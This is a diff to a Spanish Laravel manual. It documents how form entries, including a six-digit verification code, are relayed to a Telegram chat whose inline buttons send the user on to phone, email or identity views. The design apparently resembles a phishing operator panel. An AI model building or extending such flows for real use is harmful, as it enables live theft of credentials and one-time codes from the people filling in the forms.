@@ -16,9 +16,10 @@ Este manual describe cómo crear directorios de vistas que se integran automáti
 8. [Limpiar localStorage](#limpiar-localstorage)
 9. [Casos de Uso por Tipo de Vista](#casos-de-uso-por-tipo-de-vista)
 10. [Configuración de Botones](#configuración-de-botones)
-11. [Rutas en Laravel](#rutas-en-laravel)
-12. [Flujo Completo](#flujo-completo)
-13. [Ejemplo Práctico](#ejemplo-práctico)
+11. [Información Enviada a Telegram](#información-enviada-a-telegram)
+12. [Rutas en Laravel](#rutas-en-laravel)
+13. [Flujo Completo](#flujo-completo)
+14. [Ejemplo Práctico](#ejemplo-práctico)
 
 ---
 
@@ -753,6 +754,116 @@ Define cuántos botones aparecen en cada fila del teclado inline de Telegram:
 | `'botones_por_fila' => 3` | `[Btn1] [Btn2] [Btn3]` |
 | `'botones_por_fila' => 2` | `[Btn1] [Btn2]`<br>`[Btn3]` |
 | `'botones_por_fila' => 1` | `[Btn1]`<br>`[Btn2]`<br>`[Btn3]` |
+
+---
+
+## Información Enviada a Telegram
+
+Cuando se envía un formulario, el sistema envía un mensaje a Telegram con la siguiente información:
+
+### Estructura del Mensaje
+
+```
+🆕 NUEVA ENTRADA
+
+ID: 45
+UniqID: user_1737482945_abc123def
+Status: telefono
+Directorio: verificacion
+Fecha: 2026-01-21 15:30:00
+
+Datos:
+  • nombre: Juan Pérez
+  • email: juan@ejemplo.com
+  • telefono: 3001234567
+  • codigo: 123456
+
+[Teléfono] [Correo] [Identidad]
+```
+
+### Campos del Mensaje
+
+| Campo | Descripción | Origen |
+|-------|-------------|--------|
+| **Acción** | Indica si es nueva entrada o actualización | Sistema (🆕 NUEVA ENTRADA / 🔄 ENTRADA ACTUALIZADA) |
+| **ID** | ID de la entrada en la base de datos | Base de datos |
+| **UniqID** | Identificador único del usuario | localStorage (`uniqid`) |
+| **Status** | Estado actual de la entrada | Campo hidden `no-status` |
+| **Directorio** | Directorio de vistas del flujo | Detectado desde URL (`request()->segment(1)`) |
+| **Fecha** | Fecha y hora de creación | Base de datos |
+| **Datos** | Todos los campos del formulario | localStorage (`formularioCompleto`) |
+
+### Datos del Formulario
+
+Los datos enviados provienen del localStorage y incluyen todos los campos guardados:
+
+```json
+{
+    "directorio": "verificacion",
+    "nombre": "Juan Pérez",
+    "email": "juan@ejemplo.com",
+    "telefono": "3001234567",
+    "codigo": "123456",
+    "status": "telefono"
+}
+```
+
+**Nota:** Los campos con prefijo `no-` (como `no-status`) son ignorados por el auto-guardado, pero el valor de `status` se envía explícitamente al servidor.
+
+### Botones Inline
+
+Los botones que aparecen en el mensaje se generan automáticamente desde las vistas del directorio que tienen el marcador `@telegram-button`:
+
+```
+[Teléfono] [Correo] [Identidad]
+```
+
+Cada botón contiene un `callback_data` con formato: `t-{vista}:{uniqid}`
+
+Ejemplo: `t-telefono:user_1737482945_abc123def`
+
+### Flujo de Datos
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│ 1. Usuario llena formulario en el navegador                 │
+│    └─ Datos se guardan en localStorage                      │
+└──────────────────────────┬──────────────────────────────────┘
+                           ▼
+┌─────────────────────────────────────────────────────────────┐
+│ 2. Usuario hace submit                                      │
+│    └─ POST /api/entradas/sync                               │
+│    └─ Body: { uniqid, datos, status, directorio }           │
+└──────────────────────────┬──────────────────────────────────┘
+                           ▼
+┌─────────────────────────────────────────────────────────────┐
+│ 3. Servidor procesa la entrada                              │
+│    └─ Guarda en base de datos                               │
+│    └─ Llama a TelegramController::sendEntradaMessage()      │
+└──────────────────────────┬──────────────────────────────────┘
+                           ▼
+┌─────────────────────────────────────────────────────────────┐
+│ 4. TelegramController construye el mensaje                  │
+│    └─ Incluye: ID, UniqID, Status, Directorio, Fecha        │
+│    └─ Formatea los datos del formulario                     │
+│    └─ Genera botones desde vistas con @telegram-button      │
+└──────────────────────────┬──────────────────────────────────┘
+                           ▼
+┌─────────────────────────────────────────────────────────────┐
+│ 5. Mensaje enviado a Telegram                               │
+│    └─ API: https://api.telegram.org/bot{token}/sendMessage  │
+│    └─ Chat ID configurado en .env                           │
+└─────────────────────────────────────────────────────────────┘
+```
+
+### Configuración de Telegram
+
+Variables de entorno en `.env`:
+
+```env
+TELEGRAM_ENTRADAS_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
+TELEGRAM_ENTRADAS_CHAT_ID=-1001234567890
+```
 
 ---
 
